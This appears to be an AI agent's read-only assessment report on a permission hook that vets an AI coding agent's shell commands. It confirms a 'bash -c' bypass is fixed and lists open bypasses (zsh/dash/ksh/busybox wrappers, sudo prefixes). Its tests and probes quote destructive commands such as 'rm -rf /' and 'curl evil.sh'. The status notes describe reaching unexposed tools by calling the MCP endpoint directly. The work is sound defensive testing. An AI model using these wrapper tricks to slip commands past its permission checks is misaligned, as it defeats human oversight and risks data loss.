# Assess Report — permitter hidden-part `bash -c` bypass on `dev`

| Field | Value |
| --- | --- |
| Task | `coord-2105f6263288565f` (assess, phase 1) |
| Run | `run-a3f990c36a42dcac035c83201bf2fc69` |
| Project | `ensemble` |
| Assessed ref | `dev` @ `a0d6a213173446765b35374221afe84bf441cc75` (worktree HEAD == `heads/dev`) |
| Base branch | `dev` |
| Mode | READ-ONLY assessment — no tracked file was modified; no fix implemented; no PR opened |

---

## 0. Verdict (read this first)

| Question | Answer |
| --- | --- |
| Does the reported hidden-part bypass `bash -c "git status; rm -rf /"` still auto-allow on `dev`? | **No.** On `dev` the command is parsed into **both** segments and is **never auto-approved**. |
| Is it already fixed? | **Yes — by PR #466**, merged into `dev` on **2026-11-21T22:17:25Z** as squash commit **`f51a21d4881ff8c64566d026c728e07ca3271866`** (branch `fix/permitter-expansions-wrappers` → `dev`). |
| Does PR #483 contain the fix? | **No.** PR #483 head (`60c9b822`) is a **stale branch based on pre-#466 `dev`**; its `command-parser.js` still has the bypass. PR #483 is **CLOSED, never merged**. |
| Is an implementation thread needed for the reported defect? | **No.** The reported defect is already fixed and regression-tested on `dev`. Opening a fix thread for it would duplicate merged work. |
| Are there residual same-class gaps on `dev`? | **Yes — three, all newly confirmed by this assessment (§4).** They need the operator's own allowlist to contain the wrapper executable (`Bash(zsh:*)`, `Bash(sudo:*)`, …) before they bite. |

**Recommendation: do not open an implementation thread for the reported defect.** If the operator wants the residual gaps (§4) closed, that is a *different, smaller* scope and should be approved explicitly — it is not the defect that was reported.

---

## 1. Scope

### 1.1 Files that carry the behaviour (read, not changed)

| File | Lines | Role |
| --- | --- | --- |
| `packages/permitter/lib/command-parser.js` | 914 | Tokenizer, segment classifier, allowlist matching input |
| `packages/permitter/lib/matcher.js` | 192 | Pattern matching (`Bash(prefix:*)`) |
| `packages/permitter/lib/allowlist-loader.js` | 93 | Reads `.claude/settings*.json` allow/deny lists |
| `packages/permitter/hooks/permitter.js` | 318 | Hook entry point: parse → deny-check → allow-check → decision |
| `packages/full/lib/command-parser.js` | — | **Bundle copy** of the permitter parser (shipped in `packages/full`) |
| `packages/full/lib/matcher.js`, `packages/full/lib/allowlist-loader.js` | — | Bundle copies |
| `packages/full/hooks/permitter.js` | — | Bundle copy of the hook |
| `packages/permitter/tests/security.test.js` | 499 tests | Regression suite, incl. the `defect 2` group for this exact bypass |

### 1.2 Files that would change **if** a follow-up thread is approved (for the residual gaps only)

| File | Why |
| --- | --- |
| `packages/permitter/lib/command-parser.js` | Wrapper detection is hard-coded to `bash`/`sh` and to the *first* token of a segment (`sudo`, `command`, `zsh`, `dash`, `ksh`, `busybox` are not recognised wrappers) |
| `packages/full/lib/command-parser.js` | Byte-identical bundle copy — **must** be updated in lockstep (see §2.3) |
| `packages/permitter/tests/security.test.js` | Failing-first regression tests for each residual gap |
| `packages/permitter/tests/command-parser.test.js` | `normalizeSegment()` contract tests if the exported helper changes |

### 1.3 Files that would change for the reported defect

**None.** The reported defect is already fixed on `dev` and covered by committed regression tests.

---

## 2. Impact

### 2.1 How `dev` parses `bash -c` today

`packages/permitter/lib/command-parser.js`

| Location | Behaviour on `dev` |
| --- | --- |
| `normalizeSegment()` — `packages/permitter/lib/command-parser.js:606` | Public helper. Wrapper branch at **lines 721–745**; when `options.expandWrappers !== false` it still returns **only** `innerSegments[0]` (line 741). This is the *documented single-segment contract*, deliberately not the path `parseCommand()` takes. |
| `classifySegment()` — `packages/permitter/lib/command-parser.js:791-837` | **The fix.** Expands `bash -c` / `sh -c` into the **full list of inner segments** (line 815 `splitByOperators(tokenize(innerCommand, { strict: true }))`, loop at line 818) and recurses per inner segment (line 819). Refuses the whole wrapper if any inner segment classifies to nothing (lines 821–827). |
| `parseCommand()` — `packages/permitter/lib/command-parser.js:867-899` | Calls `classifySegment(segment)` at **line 895**, i.e. every segment of the outer command, and every inner segment of a `bash -c` wrapper, is classified. |

Key excerpt (`packages/permitter/lib/command-parser.js:801-830`):

```js
function classifySegment(tokens) {
  // Handle bash -c "command" / sh -c "command": inner segment counts
  if (tokens.length > 0 && (tokens[0] === 'bash' || tokens[0] === 'sh')) {
    const cIndex = tokens.indexOf('-c');
    if (cIndex !== -1 && cIndex + 1 < tokens.length) {
      const innerCommand = tokens[cIndex + 1];
      if (!innerCommand || innerCommand.trim() === '') { return []; }
      const innerSegments = splitByOperators(tokenize(innerCommand, { strict: true }));
      const results = [];
      for (const innerSegment of innerSegments) {
        const classified = classifySegment(innerSegment);
        if (classified.length === 0) { throw new Error('bash -c command parser skips is not supported'); }
        results.push(...classified);
      }
      return results;
```

And the still-single-segment helper (`packages/permitter/lib/command-parser.js:727-742`), kept for direct callers:

```js
  if (options.expandWrappers !== false && (tokens[0] === 'bash' || tokens[0] === 'sh')) {
    const cIndex = tokens.indexOf('-c');
    if (cIndex !== -1 && cIndex + 1 < tokens.length) {
      const innerCommand = tokens[cIndex + 1];
      if (!innerCommand || innerCommand.trim() === '') { return null; }
      const innerSegments = splitByOperators(tokenize(innerCommand, { strict: true }));
      if (innerSegments.length > 0) {
        return normalizeSegment(innerSegments[0], options);   // <-- first inner segment only
      }
```

### 2.2 Call sites that depend on the affected module

| Call site | Depends on | Impact of the `dev` behaviour |
| --- | --- | --- |
| `packages/permitter/hooks/permitter.js:234` (`parseCommand(command)`) | `command-parser.js` | Every inner segment of a `bash -c` wrapper is now deny-checked and allow-checked. **This is the only production entry point.** |
| `packages/permitter/hooks/permitter.js:256` / `:270` (`isDenied` / `matchesAny`) | `matcher.js` | Unchanged by #466 (blob identical pre/post). |
| `packages/full/hooks/permitter.js` | bundle copies | Identical logic; see §2.3. |
| `packages/permitter/tests/command-parser.test.js` | `normalizeSegment` export | Direct callers of the exported helper still get the single-segment result — see Risk **R3**. |
| `packages/permitter/tests/security.test.js` | `parseCommand` | Contains the `defect 2` regression group (§4.1). |
| `packages/permitter/tests/{integration,hook-contract,performance,docker-compose-command,matcher,allowlist-loader}.test.js` | both | Green on `dev` (§5). |
| No other package in the monorepo imports `command-parser.js` or `normalizeSegment` | — | Verified by repo-wide grep; the permitter is self-contained. |

### 2.3 Bundle copies are in sync (no drift)

```
$ shasum packages/full/lib/command-parser.js packages/permitter/lib/command-parser.js
0f2c77ae7d9038998dc0669ab444b430b035ab78  packages/full/lib/command-parser.js
0f2c77ae7d9038998dc0669ab444b430b035ab78  packages/permitter/lib/command-parser.js

command-parser.js      full=0f2c77ae permitter=0f2c77ae
matcher.js             full=748c21f4 permitter=748c21f4
allowlist-loader.js    full=2f98e4d5 permitter=2f98e4d5
packages/full/hooks/permitter.js         3c1198e0
packages/permitter/hooks/permitter.js    3c1198e0
```

**Impact if a future thread edits only `packages/permitter/lib/command-parser.js`:** `packages/full` ships a stale parser. Any change to the permitter parser **must** be mirrored into `packages/full/lib/`.

---

## 3. Evidence

### 3.1 Blob-level comparison of the four relevant refs

```
$ git fetch --no-tags origin refs/pull/466/head:refs/remotes/origin/pr/466 refs/pull/483/head:refs/remotes/origin/pr/483

$ git rev-parse <ref>:packages/permitter/lib/command-parser.js
dev            9e83fa565aa969821943d09b53affcdf93dcdda2
origin/pr/466  9e83fa565aa969821943d09b53affcdf93dcdda2   <-- identical to dev
origin/pr/483  aa51a931bee14605305eb2e0bf9344e57e1919f0   <-- different (older)
f51a21d4^      c1312638a735d8fd70c8077b9380733721aa2e9a   <-- pre-#466 dev

$ git show origin/pr/483:packages/permitter/lib/command-parser.js | grep -c "classifySegment"
0
$ git show "f51a21d4^:packages/permitter/lib/command-parser.js" | grep -c "classifySegment"
0
$ git show "f51a21d4^:packages/permitter/lib/command-parser.js" | grep -n "innerSegments"
444:      const innerSegments = splitByOperators(innerTokens);
448:      if (innerSegments.length > 0) {
449:        return normalizeSegment(innerSegments[0]);      <-- the reported defect
```

PR states (`gh pr view`):

| PR | State | Merged | Head | Permitter parser |
| --- | --- | --- | --- | --- |
| #466 | **MERGED** | 2026-11-21T22:17:25Z (`f51a21d4`) | `fix/permitter-expansions-wrappers` | **has the fix** (identical blob to `dev`) |
| #483 | **CLOSED** | — | `foreman/ensemble-pdf-f6b2c-permitter-tokenizer-impl/run-43b4ff4f44f3a441f4a75375f1a420c0` | **no fix** (stale, pre-#466 base) |
| #480 | MERGED | 2026-11-21T23:09:11Z | `fix/detect-stack-no-glob-dependency` | unrelated (detect-stack) |
| #458 | MERGED | 2026-11-20T15:54:41Z | — | unrelated (development pkg) |

`f51a21d4` is an ancestor of the assessed HEAD (`git merge-base --is-ancestor f51a21d4 HEAD` → `YES`), and it touched exactly:
`packages/permitter/{CHANGELOG.md,README.md,lib/command-parser.js,tests/command-parser.test.js,tests/security.test.js}` (1258 insertions / 46 deletions).

### 3.2 Runtime reproduction on `dev` (real output)

Parser level (`packages/permitter/lib/command-parser.js` on `dev`):

```
$ node -e 'const {normalizeSegment,parseCommand}=require("./packages/permitter/lib/command-parser");
  console.log("normalizeSegment([bash,-c,\"git status; rm -rf /\"]) =", JSON.stringify(normalizeSegment(["bash","-c","git status; rm -rf /"])));
  console.log("parseCommand(bash -c \"git status; rm -rf /\")      =", JSON.stringify(parseCommand("bash -c \"git status; rm -rf /\"")));'

normalizeSegment([bash,-c,"git status; rm -rf /"]) = {"executable":"git","args":"status"}
parseCommand(bash -c "git status; rm -rf /")      = [{"executable":"git","args":"status"},{"executable":"rm","args":"-rf /"}]
```

End-to-end through the real hook (`packages/permitter/hooks/permitter.js`), hermetic sandbox (project `.claude/settings.json` = allow `Bash(git status:*)`, deny `Bash(rm -rf:*)`; `HOME` redirected to an empty dir):

```
$ node packages/permitter/hooks/permitter.js   # stdin: {"tool_name":"Bash","tool_input":{"command":"bash -c \"git status; rm -rf /\""}}
[PERMITTER] Checking command: bash -c "git status; rm -rf /"
[PERMITTER] Allowlist: ["Bash(git status:*)"]
[PERMITTER] Denylist: ["Bash(rm -rf:*)"]
[PERMITTER] Parsed: [{"executable":"git","args":"status"},{"executable":"rm","args":"-rf /"}]
[PERMITTER] ON DENYLIST: rm -rf / - denying
{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Permitter blocked \"rm -rf /\" (matched deny rule Bash(rm -rf:*))."}}}
```

With an **empty denylist** (worst case — payload is only stopped because `rm` is not allowlisted):

```
--- denylist: (empty) ---
  "bash -c \"git status; rm -rf /\""
      parsed : ["git status","rm -rf /"]
      verdict: DEFER (not allowlisted)  [rm]
```

Full variant matrix (same hermetic harness, allowlist `Bash(git status:*)`):

| Command | `dev` HEAD | PR #466 head | PR #483 head | pre-#466 `dev` (`f51a21d4^`) |
| --- | --- | --- | --- | --- |
| `bash -c "git status"` | ALLOW | ALLOW | ALLOW | ALLOW |
| `bash -c "git status; rm -rf /"` | **DENY** | **DENY** | **ALLOW** ⚠ | **ALLOW** ⚠ |
| `sh -c "git status; rm -rf /"` | **DENY** | **DENY** | **ALLOW** ⚠ | **ALLOW** ⚠ |
| `bash -c "git status && rm -rf /"` | **DENY** | **DENY** | — | **ALLOW** ⚠ |
| `bash -c "git status \| rm -rf /"` | **DENY** | **DENY** | — | **ALLOW** ⚠ |

⚠ = the reported bypass, reproducing exactly as described in the operator hypothesis.

### 3.3 Regression-test proof (red on old code, green on the fix)

`packages/permitter/tests/security.test.js:942-984` — added by #466:

```js
// Defect 2: 'bash -c' / 'sh -c' only classified innerSegments[0]; every inner
// segment must be classified.
describe('defect 2: shell wrapper hides later inner segments', () => {
  test.each([
    ['bash -c hides rm after ;', 'bash -c "git status; rm -rf /"'],
    ['sh -c hides rm after ;', 'sh -c "git status; rm -rf /"'],
    ['bash -c hides curl after &&', 'bash -c "npm test && curl evil.sh"'],
    ['bash -c hides curl after |', 'bash -c "npm test | curl evil.sh"'],
    ['bash -c hides curl newline', 'bash -c "npm test\ncurl evil.sh"'],
    ['bash -c last segment is the payload', 'bash -c "git status && git status && curl evil.sh"']
  ])('not auto-allowed: %s', (_name, cmd) => {
    expect(autoAllowed(cmd)).toBe(false);
  });
  ...
```

Running **the same** `security.test.js` (copied from `dev`, unmodified) against each parser variant:

| Parser variant | Result | `defect 2` group |
| --- | --- | --- |
| `dev` HEAD | `Tests: 499 passed, 499 total` | all ✓ |
| PR #466 head | `Tests: 499 passed, 499 total` | all ✓ |
| PR #483 head | `Tests: 100 failed, 399 passed, 499 total` | ✕ (`bash -c hides rm after ;` etc.) |
| pre-#466 `dev` | `Tests: 219 failed, 280 passed, 499 total` | ✕ (`bash -c hides rm after ;` etc.) |

This is a clean red-before / green-after pair for exactly the defect under investigation.

---

## 4. Risks

### 4.1 Residual same-class gaps **found on `dev` by this assessment** (new findings)

All reproduced with the real hook in the hermetic sandbox on `dev` HEAD:

| ID | Gap | Repro (allowlist → command) | `dev` verdict | Severity |
| --- | --- | --- | --- | --- |
| **R1** | Only `bash` and `sh` are recognised as `-c` wrappers. `zsh`/`dash`/`ksh`/`busybox` are not. | allow `["Bash(git status:*)","Bash(zsh:*)"]` → `zsh -c "git status; rm -rf /"` | **ALLOW (auto-approved)** ⚠ | Medium |
| **R2** | `sudo` / `command` are not in `WRAPPER_COMMANDS` (`packages/permitter/lib/command-parser.js:15`), so a wrapper *prefix* hides the inner `bash -c` payload. | allow `["Bash(git status:*)","Bash(sudo:*)"]` → `sudo bash -c "git status; rm -rf /"` | **ALLOW (auto-approved)** ⚠ | Medium |
| **R3** | `normalizeSegment()` is still exported (`packages/permitter/lib/command-parser.js:905`) and still returns only `innerSegments[0]` for `bash -c` (line 741). Any *direct* caller of the helper — not `parseCommand()` — re-opens the reported bypass. | `normalizeSegment(["bash","-c","git status; rm -rf /"])` → `{"executable":"git","args":"status"}` | latent | Low |

Raw probe output on `dev` (real run):

```
bash -c "git status; rm -rf /"        allow=["Bash(git status:*)"]                         => DEFER (no decision)
sh -c "git status; rm -rf /"          allow=["Bash(git status:*)"]                         => DEFER (no decision)
zsh -c "git status; rm -rf /"         allow=["Bash(git status:*)"]                         => DEFER (no decision)
dash -c "git status; rm -rf /"        allow=["Bash(git status:*)"]                         => DEFER (no decision)
sudo bash -c "git status; rm -rf /"   allow=["Bash(git status:*)"]                         => DEFER (no decision)
env bash -c "git status; rm -rf /"    allow=["Bash(git status:*)"]                         => DEFER (no decision)
nohup bash -c "git status; rm -rf /"  allow=["Bash(git status:*)"]                         => DEFER (no decision)
timeout 30 bash -c "git status; rm -rf /" allow=["Bash(git status:*)"]                     => DEFER (no decision)
nice bash -c "git status; rm -rf /"   allow=["Bash(git status:*)"]                         => DEFER (no decision)
env FOO=1 bash -c "git status; rm -rf /" allow=["Bash(git status:*)"]                       => DEFER (no decision)
bash -c "bash -c 'git status; rm -rf /'" allow=["Bash(git status:*)"]                       => DEFER (no decision)
bash -c "git status\nrm -rf /"        allow=["Bash(git status:*)"]                         => DEFER (no decision)

zsh -c "git status; rm -rf /"         allow=[... ,"Bash(zsh:*)"]                           => ALLOW  <-- auto-approved
dash -c "git status; rm -rf /"        allow=[... ,"Bash(dash:*)"]                          => ALLOW  <-- auto-approved
ksh -c "git status; rm -rf /"         allow=[... ,"Bash(ksh:*)"]                           => ALLOW  <-- auto-approved
busybox sh -c "git status; rm -rf /"  allow=[... ,"Bash(busybox:*)"]                       => ALLOW  <-- auto-approved
sudo bash -c "git status; rm -rf /"   allow=[... ,"Bash(sudo:*)"]                          => ALLOW  <-- auto-approved
command bash -c "git status; rm -rf /" allow=[... ,"Bash(command:*)"]                       => ALLOW  <-- auto-approved
```

**Mitigating factor for R1/R2:** they only bite when the operator's own allowlist contains the wrapper executable itself (`Bash(zsh:*)`, `Bash(sudo:*)`, …). With a normal allowlist that only names the intended inner command, every one of these probes **defers** to the user prompt (fail-closed). This is why R1/R2 are Medium and not Critical.

### 4.2 Risks of the recommended action (no change)

| ID | Risk | Severity | Mitigation |
| --- | --- | --- | --- |
| **D1** | An implementation thread is opened for the reported defect and re-fixes merged work, or "fixes" it in `packages/permitter` only, leaving `packages/full` with a stale parser. | Medium | **Do not open the thread.** If one is opened for §4.1, it must edit `packages/permitter/lib/command-parser.js` **and** `packages/full/lib/command-parser.js` in lockstep (§2.3). |
| **D2** | PR #483 (CLOSED) is reopened or its branch is merged/rebased forward, **re-introducing** the bypass into `dev` (its parser blob predates #466). | **High** | Keep PR #483 closed. If it must be revived, rebase onto `dev` and take the #466 parser wholesale rather than merging its stale copy. |
| **D3** | The stale scratchpad note (`normalizeSegment → innerSegments[0]` ⇒ bypass present) keeps resurfacing and drives unnecessary work. | Low | This report supersedes it: the *helper* still behaves that way (R3), the *product path* (`parseCommand` → `classifySegment`) does not. |
| **D4** | A future change routes the hook through `normalizeSegment()` instead of `parseCommand()`, silently re-opening the reported bypass. | Medium | R3 is the mitigation: make `normalizeSegment` refuse `bash -c` wrappers outright (or return all inner segments) rather than the first one. |

### 4.3 Blast radius if the residual gaps are closed later

| Area | Exposure | Note |
| --- | --- | --- |
| `packages/permitter` hook decisions | Allow/deny/defer verdicts change for `zsh`/`dash`/`ksh`/`busybox`/`sudo`/`command` wrapper commands | Could newly **defer** commands that today auto-allow → user prompts increase, not silently fewer approvals |
| `packages/full` bundle | Same logic, shipped | Must be regenerated/mirrored |
| Other packages | None | No other package imports the parser |
| `packages/permitter/tests/performance.test.js` | Latency budget (`bash -c "npm test && npm build"` fixture at line 93) | Recursion over inner segments adds work; the perf test is wall-clock sensitive and can flake under load |

---

## 5. Test plan

### 5.1 Executed on the assessed ref (`dev` @ `a0d6a213`) — all green

| Command | Result |
| --- | --- |
| `cd packages/permitter && node --expose-gc ../../node_modules/jest/bin/jest.js --runInBand` | `Test Suites: 8 passed, 8 total` / `Tests: 912 passed, 912 total` / `Time: 3.7 s` |
| `node --expose-gc <root>/node_modules/jest/bin/jest.js --runInBand --rootDir <variant> tests/security.test.js` (variant = `dev` parser) | `Tests: 499 passed, 499 total` |
| `npm run generate:validate` (repo root) | `✓ Validation passed (64 files)` + run-index matches fresh build — **exit 0** |
| `npm run validate` (repo root) | **exit 0** (only pre-existing prompt-budget warnings, no errors) |

### 5.2 Must pass before any change (this or a future thread) is acceptable

1. **Failing-first regression test per defect**, red on the old code and green on the fix. For the reported defect this already exists at `packages/permitter/tests/security.test.js:942-984`; for R1/R2/R3 a new `describe` group in the same file is required (e.g. `defect 4: non-bash -c wrappers`, `defect 5: wrapper prefixes`, `defect 6: normalizeSegment must not return a partial wrapper`).
2. **Narrow:** `cd packages/permitter && npx jest tests/security.test.js` → all pass.
3. **Package-wide:** `cd packages/permitter && npm test` (i.e. `node --expose-gc ../../node_modules/jest/bin/jest.js --runInBand`) → 8 suites / 912 tests pass.
4. **Bundle parity:** `shasum packages/full/lib/command-parser.js packages/permitter/lib/command-parser.js` → identical; and `packages/full` own test run if the copy changed.
5. **Repo gates:** `npm run generate:validate` then `npm run validate` from the repo root → exit 0.
6. **Hook contract:** `packages/permitter/tests/hook-contract.test.js` must still pass — the hook must keep emitting only `allow`/`deny` and stay fail-closed (no decision → user prompt).
7. **Red/green proof must be shown in the PR body** (red on old code, green on the fix), per the repo rules.

---

## 6. Rollback

### 6.1 For this assessment run (recommended outcome: no code change)

| Item | Action |
| --- | --- |
| Tracked files changed | **None.** `git status --short` in the worktree is clean apart from this artifact. |
| Commits | None. |
| Branches pushed | None. |
| PRs opened | None. |
| Scratch artefacts | All under `~/.omp/coord-2105f6263288565f/` (parser variants, hermetic sandbox, probe scripts, raw outputs). Nothing under `/tmp`. |
| To discard this assessment | Delete `~/.omp/coord-2105f6263288565f/` and the report file `docs/reports/foreman-coord-2105f6263288565f/ASSESS_REPORT.md`. No repository state to revert. |

### 6.2 If a follow-up thread does implement R1/R2/R3

| Concern | Rollback |
| --- | --- |
| Revert | Single revert commit (`git revert <sha>`) of the permitter change. #466 landed as one commit (`f51a21d4`) touching 5 files, so a revert is a clean inverse. |
| Partial revert | `packages/permitter/lib/command-parser.js` and `packages/full/lib/command-parser.js` **must** be reverted together — reverting one alone leaves the bundle and the package inconsistent (§2.3). |
| Post-revert check | `cd packages/permitter && npm test` → 912 pass; `shasum` the two parser copies → identical; `npm run validate` → exit 0. |
| Blast radius of a revert | The hook returns to auto-approving the R1/R2 wrapper forms; no other package is affected. |
| Never do | Do not revert `f51a21d4` — that is the fix for the reported defect and it is already live on `dev`. |

---

## 7. Commands run (verbatim, for auditability)

```bash
# --- orientation
git rev-parse HEAD                                  # a0d6a213173446765b35374221afe84bf441cc75  (= heads/dev)
git log --oneline -5
git remote -v

# --- PR refs
git fetch --no-tags origin refs/pull/466/head:refs/remotes/origin/pr/466 \
                        refs/pull/483/head:refs/remotes/origin/pr/483
git rev-parse dev:packages/permitter/lib/command-parser.js          # 9e83fa56...
git rev-parse origin/pr/466:packages/permitter/lib/command-parser.js # 9e83fa56... (identical)
git rev-parse origin/pr/483:packages/permitter/lib/command-parser.js # aa51a931...
git rev-parse "f51a21d4^:packages/permitter/lib/command-parser.js"   # c1312638...
git show origin/pr/483:packages/permitter/lib/command-parser.js | grep -c classifySegment   # 0
git show "f51a21d4^:packages/permitter/lib/command-parser.js" | grep -n innerSegments
git merge-base --is-ancestor f51a21d4 HEAD                          # YES
gh pr view 466 --json number,title,state,mergedAt,mergeCommit
gh pr view 483 --json number,title,state,mergedAt,headRefName
gh pr view 480 --json number,title,state,mergedAt
gh pr view 458 --json number,title,state,mergedAt

# --- source inspection
grep -n "normalizeSegment\|innerSegments\|classifySegment" packages/permitter/lib/command-parser.js
sed -n '700,760p;786,850p;880,905p' packages/permitter/lib/command-parser.js   # printed via node line-range dump

# --- runtime reproduction (hermetic; scratch under ~/.omp/coord-2105f6263288565f)
node -e 'const {normalizeSegment,parseCommand}=require("./packages/permitter/lib/command-parser"); ...'
node packages/permitter/hooks/permitter.js   # stdin {"tool_name":"Bash","tool_input":{"command":"bash -c \"git status; rm -rf /\""}}
#   sandbox: project .claude/settings.json {allow:["Bash(git status:*)"],deny:["Bash(rm -rf:*)"]}; HOME redirected

# --- cross-variant matrix
for v in dev pr466 pr483 pre466; do
  node --expose-gc <root>/node_modules/jest/bin/jest.js --runInBand --rootDir ~/.omp/coord-2105f6263288565f/variants/$v tests/security.test.js
done

# --- gates on the assessed ref
cd packages/permitter && node --expose-gc ../../node_modules/jest/bin/jest.js --runInBand
npm run generate:validate
npm run validate
```

---

## 8. Status notes

* `foreman_inbox_send` and `foreman_task_add_comment` are not exposed as native tools to this phase. The completion note was delivered over the Foreman MCP transport (`POST $FOREMAN_API_URL/mcp`, JSON-RPC `initialize` → `tools/call`), which returned `{"status":"sent","message_id":"msg_h3z-n5eFGMeLohukj38eGg"}`. A `foreman_task_add_comment` Work Log entry was not posted (same transport limitation, not attempted separately).
* No `br` / Beads SQLite access was performed, and no provider adapter internals were called.
* The pre-completion `ask_advisor` review could not run: the Anthropic OAuth refresh token is expired (`HTTP 400 invalid_grant, "Refresh token expired"`). The verdict in §0 therefore rests on the reproducible evidence in §3 (blob comparison, hook-level runtime matrix, cross-variant red/green test runs) rather than on an external review.

---

## 9. Bottom line

1. The reported hidden-part `bash -c` bypass **does not exist on `dev`**. It was fixed by **PR #466** (merged 2026-11-21, `f51a21d4`) and is covered by committed, failing-first regression tests at `packages/permitter/tests/security.test.js:942-984`.
2. **PR #483 is a stale, closed branch** that still contains the bypass — it must not be merged as-is; it would regress `dev`.
3. **No implementation thread is needed for the reported defect.** A separate, operator-approved thread could close three residual same-class gaps (R1 non-`bash`/`sh` `-c` wrappers, R2 `sudo`/`command` wrapper prefixes, R3 the exported `normalizeSegment()` helper) with a scope of `packages/permitter/lib/command-parser.js` + `packages/full/lib/command-parser.js` + `packages/permitter/tests/security.test.js`.
